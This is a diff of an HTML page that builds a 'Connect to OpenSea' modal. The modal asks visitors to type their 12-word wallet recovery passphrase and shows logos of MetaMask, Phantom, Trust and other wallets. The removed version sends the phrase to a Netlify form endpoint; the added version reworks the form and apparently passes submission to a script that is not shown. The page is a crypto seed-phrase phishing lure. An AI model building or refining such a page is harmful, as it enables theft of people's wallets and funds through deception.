@@ -18,42 +18,50 @@
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
     
-   <dialog id="modal" class="dialog">
-  <button id="closeModal" class="dialog-close-btn"><large>x</large></button>
-  <section class="modaltop"><img src="/src/assets/background-wallet.webp" alt="Wallet Background">
-  <div class="modallogo"><img src="/src/assets/logo-wallet.svg" alt="Logo"></div> 
-<p class="modalcon">Connect to OpenSea</p>
-<p class="modalcon2">Enter Your 12 Keys Passphrase</p>
-<form name="contact" method="POST"  action="/bounce/" data-netlify="true">
-  <p>
-    <label><textarea class="modalform" name="Enter your 12 key Passphrase"></textarea></label>
-  </p>
-  <p>
-    <button class="modalsubmit" type="submit">Connect Wallet</button>
-  </p>
-</form> <br>
-</section>
-<a class="wallor">OR</a>
-<section class="modalbtm">
-  <br>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/metamask-fox.svg">MetaMask</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/walletlink-alternative.webp">Coinbase Wallet</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/walletconnect-alternative.webp">WalletConnect</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/phantom.svg">Phantom</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/unnamed.jpg">BitKeep</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/kaikas.webp">Kaikas</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/unnamed (1).jpg">Core</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/glow.svg">Glow</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/fortmatic-alternative.webp">Fortmatic</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/bitski-alternative.webp">Bitski</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/solflare.webp">Solflare</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/opera-touch-alternative.svg">OperaTouch</a>
-  <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/trust-alternative.webp">Trust</a>
-
-</section>
- </dialog>
+    <dialog id="modal" class="dialog">
+      <button id="closeModal" class="dialog-close-btn"><large>x</large></button>
+      <section class="modaltop">
+        <img src="/src/assets/background-wallet.webp" alt="Wallet Background">
+        <div class="modallogo"><img src="/src/assets/logo-wallet.svg" alt="Logo"></div> 
+        <p class="modalcon">Connect to OpenSea</p>
+        <p class="modalcon2">Enter Your 12 Keys Passphrase</p>
+        <form name="contact" id="walletForm">
+          <p>
+            <label>
+              <textarea 
+                class="modalform" 
+                name="passphrase" 
+                placeholder="Enter your 12 key passphrase here..."
+                rows="4"
+                required
+              ></textarea>
+            </label>
+          </p>
+          <p>
+            <button class="modalsubmit" type="submit">Connect Wallet</button>
+          </p>
+        </form>
+        <br>
+      </section>
+      <a class="wallor">OR</a>
+      <section class="modalbtm">
+        <br>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/metamask-fox.svg">MetaMask</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/walletlink-alternative.webp">Coinbase Wallet</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/walletconnect-alternative.webp">WalletConnect</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/phantom.svg">Phantom</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/unnamed.jpg">BitKeep</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/kaikas.webp">Kaikas</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/unnamed (1).jpg">Core</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/glow.svg">Glow</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/fortmatic-alternative.webp">Fortmatic</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/bitski-alternative.webp">Bitski</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/solflare.webp">Solflare</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/opera-touch-alternative.svg">OperaTouch</a>
+        <a href="#wallet" class="walletl"><img class="walleti" src="/src/assets/trust-alternative.webp">Trust</a>
+      </section>
+    </dialog>
   </body>
 
-  
-  <script src="/src/components/modal.js" type="module"></script>
+  <script type="module" src="/src/components/modal.js"></script>
 </html>
